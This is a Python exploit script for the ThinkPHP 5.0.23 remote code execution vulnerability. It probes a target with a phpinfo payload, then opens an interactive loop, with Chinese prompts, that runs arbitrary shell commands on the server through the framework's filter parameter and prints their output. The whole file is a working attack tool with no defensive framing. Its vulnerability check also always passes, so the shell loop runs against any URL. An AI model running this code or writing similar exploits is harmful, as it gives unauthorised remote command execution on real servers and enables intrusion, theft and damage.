import requests
import re
import urllib

def thinkphp5023_rce(url):
    relsult = {
        'name': 'ThinkPHP5 5.0.23 Remote Code Execution Vulnerability',
        'vulnerable': False
    }
    try:
        target = url + '/index.php?s=captcha'
        target = urllib.parse.urljoin(url, '/index.php?s=captcha')
        payload = r'_method=__construct&filter[]=phpinfo&method=get&server[REQUEST_METHOD]=1'
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0',
            'Content-Type': 'application/x-www-form-urlencoded',
        }
        response = requests.post(target, data=payload, timeout=3, verify=False, headers=headers)
        if re.search(r'PHP Version', response.text):
            relsult['vulnerable'] = True
            relsult['method'] = 'POST'
            relsult['url'] = target
            relsult['position'] = 'data'
            relsult['payload'] = payload
            relsult['exp'] = True
        return relsult
    except:
        return relsult

# getshell
def exp():
    url = input('输入目标URL:')
    if thinkphp5023_rce(url):
        print('[+] 存在 ThinkPHP5 5.0.23 Remote Code Execution Vulnerability')
        target = url + '/index.php?s=captcha'
        basic_payload = '_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]={0}'
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0',
            'Content-Type': 'application/x-www-form-urlencoded',
        }
        while True:
            cmd_shell = input('[+] 执行命令:')
            payload = basic_payload.format(cmd_shell)
            response = requests.post(target, data=payload, headers=headers, timeout=3, verify=False)
            output = re.search(r'([^<]*)', response.text)[0]
            print(output)


if __name__ == '__main__':
    exp()